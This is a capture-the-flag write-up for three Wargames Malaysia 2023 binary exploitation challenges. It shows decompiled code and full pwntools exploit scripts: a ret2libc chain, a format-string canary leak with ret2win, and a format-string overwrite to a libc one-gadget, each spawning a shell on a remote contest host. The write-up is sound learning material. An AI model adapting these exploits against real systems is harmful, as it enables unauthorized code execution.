---
title:  "WGMY 2023"
date: 2023-12-18T22:00:00+08:00
description: "Wargames Malaysia 2023 Write Ups"
---

For this CTF, I mainly worked on the pwn challenges as I wanted to try and learn something new :D I managed to solve 3 of the pwns and will be detailing my write up below 

# Magic Door (942)
## idea
basic ret2libc after passing the first check in the function `open_the_door`

```c
__int64 open_the_door()
{
  char s1[12]; // [rsp+0h] [rbp-10h] BYREF
  int v2; // [rsp+Ch] [rbp-4h]

  initialize();
  puts("Welcome to the Magic Door !");
  printf("Which door would you like to open? ");
  __isoc99_scanf("%11s", s1);
  getchar();
  if ( !strcmp(s1, "50015") )
    return no_door_foryou();
  v2 = atoi(s1);
  if ( v2 != 50015 )
    return no_door_foryou();
  else
    return magic_door(50015LL);
}
```

In this function, the check will fail if the string entered is exactly `50015`, and if the integers in the string is not `50015`. This means that it is possible to pass this check by appending a letter to the end of `50015`. In my solution, I used `50015a`, which passes the `strcmp` check, and also the integer check in the function.

After reaching the `magic_door` function, it is possible to exploit it as we normally do with ret2libc challenges.

## solution
```py
from pwn import *

#p = process('./magic_door')
p = remote('13.229.84.41', 10002)
context.binary = elf = ELF('./magic_door')
libc = ELF('./libc.so.6')

p.sendline(b'50015a')

payload = b'A'* 72

rop = ROP(elf)
rop.call(rop.ret[0])
rop.puts(elf.got.puts)
rop.puts(elf.got.printf)
rop.magic_door()


p.sendline(payload + rop.chain())

p.recvuntil(b'go? \n')

puts = u64(p.recvline().rstrip(b'\n').ljust(8, b'\x00'))
printf = u64(p.recvline().rstrip(b'\n').ljust(8, b'\x00'))

libc.address = puts - libc.sym.puts

binsh = (next(libc.search(b'/bin/sh')))
rop = ROP([libc, elf])
rop.call(rop.ret[0])
rop.system(binsh)
p.sendline(payload + rop.chain())

p.clean()

p.interactive()
```

# Pak Mat Burger (990)
## idea 
format string + canary + ret2win

```
pak-mat-burger ➜ checksec pakmat_burger
[*] '/home/vela/wargamesmy/pak-mat-burger/pakmat_burger'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

```
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  const char *s2; // [rsp+0h] [rbp-40h]
  char s1[9]; // [rsp+Ah] [rbp-36h] BYREF
  char s[10]; // [rsp+13h] [rbp-2Dh] BYREF
  char format[12]; // [rsp+1Dh] [rbp-23h] BYREF
  char v8[15]; // [rsp+29h] [rbp-17h] BYREF
  unsigned __int64 v9; // [rsp+38h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  initialize(argc, argv, envp);
  s2 = getenv("SECRET_MESSAGE");
  if ( s2 )
  {
    puts("Welcome to Pak Mat Burger!");
    printf("Please enter your name: ");
    __isoc99_scanf("%11s", format);
    printf("Hi ");
    printf(format);
    printf(", to order a burger, enter the secret message: ");
    __isoc99_scanf("%8s", s1);
    if ( !strcmp(s1, s2) )
    {
      puts("Great! What type of burger would you like to order? ");
      __isoc99_scanf("%14s", v8);
      getchar();
      printf("Please provide your phone number, we will delivered soon: ");
      return (unsigned int)fgets(s, 100, stdin);
    }
    else
    {
      puts("Sorry, the secret message is incorrect. Exiting...");
      return 0;
    }
  }
  else
  {
    puts("Error: SECRET_MESSAGE environment variable not set. Exiting...");
    return 1;
  }
}
```
In this challenge, the secret always stay the same, therefore it is possible to hardcode it into the solution. From this, we can then leak the necessary addresses and carry out the exploit to get the flag.

## solution
```py
from pwn import *

#p = process('./pakmat_burger')
p = remote('13.229.84.41', 10003)

p.sendline(b'%13$p.%17$p')

p.recvuntil(b'Hi ')

secret = b'8d7e88a8'
canary = p.recvuntil(b'.').strip(b'.')
leak = p.recvuntil(b',').strip(b',')

print(secret)
print(canary)
print(leak)

win = int(leak, 16) - 0x1a
ret = int(leak,16) + 0x18a
print(win)
p.sendline(secret)

p.sendline(b'a')

payload = b'A' * 0x25
payload += p64(int(canary, 16))
payload += b'A' * 8
payload += p64(ret)
payload += p64(win)

p.sendline(payload)


p.interactive()
```

# Free Juice (996)
## idea
```c
int chooseJuices()
{
  int v1; // [rsp+Ch] [rbp-4h] BYREF

  displayAvailableJuices();
  printf("Enter the number of the chosen juice (1-5): ");
  _isoc99_scanf("%d", &v1);
  if ( v1 <= 0 || v1 > 5 )
    return puts("Invalid selection. Please try again.");
  chosenJuice = malloc(0x114uLL);
  if ( !chosenJuice )
  {
    perror("Error allocating memory");
    exit(1);
  }
  strcpy((char *)chosenJuice, &availableJuices[276 * v1 - 276]);
  *((_DWORD *)chosenJuice + 64) = *(_DWORD *)&availableJuices[276 * v1 - 20];
  strcpy((char *)chosenJuice + 260, &availableJuices[276 * v1 - 16]);
  return printf("You chose %s juice.\n", (const char *)chosenJuice);
}
```
At first glance, this challenge looked like a heap challenge, but it could be solved with just the format string vulnerability that exists in `secret_juice`

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-4h] BYREF

  initialize(argc, argv, envp);
  do
  {
    displayMenu();
    printf("Enter your choice: ");
    _isoc99_scanf("%d", &v4);
    if ( v4 == 3 )
    {
      drinkJuices();
      continue;
    }
    if ( v4 > 3 )
    {
      if ( v4 == 4 )
      {
        puts("Exiting...");
        continue;
      }
      if ( v4 == 1337 )
      {
        secretJuice();
        continue;
      }
    }
    else
    {
      if ( v4 == 1 )
      {
        chooseJuices();
        continue;
      }
      if ( v4 == 2 )
      {
        refillJuices();
        continue;
      }
    }
    puts("Invalid choice. Please try again.");
  }
  while ( v4 != 4 );
  return 0;
}
```

```c
unsigned __int64 secretJuice()
{
  char format[264]; // [rsp+0h] [rbp-110h] BYREF
  unsigned __int64 v2; // [rsp+108h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( chosenJuice )
  {
    puts("Let us know what juices you need and we will get back to you!");
    _isoc99_scanf("%256s", format);
    printf("Current Juice : ");
    printf(format);
    strncpy((char *)chosenJuice, format, 0xFFuLL);
    *((_BYTE *)chosenJuice + 255) = 0;
    putchar(10);
  }
  else
  {
    puts("Please choose a juice first.");
  }
  return __readfsqword(0x28u) ^ v2;
```

By using the format string vulnerability in the `secret_juice` function, it is possible to leak the addresses and use gadgets to get a shell on the server.

## solution
```py
from pwn import *

#p = process('./free-juice')
p = remote('13.229.84.41', 10001)

context.binary = elf = ELF('./free-juice')
libc = ELF("./lib/libc-2.23.so")

p.sendline(b'1')
p.sendline(b'1')
p.sendline(b'1337')

payload = b'%2$p.%12$p'

p.sendline(payload)

p.recvuntil(b' : ')
# libc leak
leak = p.recvuntil(b'.').strip(b'.')
# stack leak
stack_leak = p.recvuntil(b'\n').strip(b'\n')
print(leak)
print(stack_leak)

libc.address = int(leak, 16) - 0x3c6780
ret_addr = int(stack_leak, 16) + 0x8
shell = libc.address + 0x45226

p.sendline(fmtstr_payload(6, {ret_addr: shell}))
p.sendline(b'4')

p.interactive()
```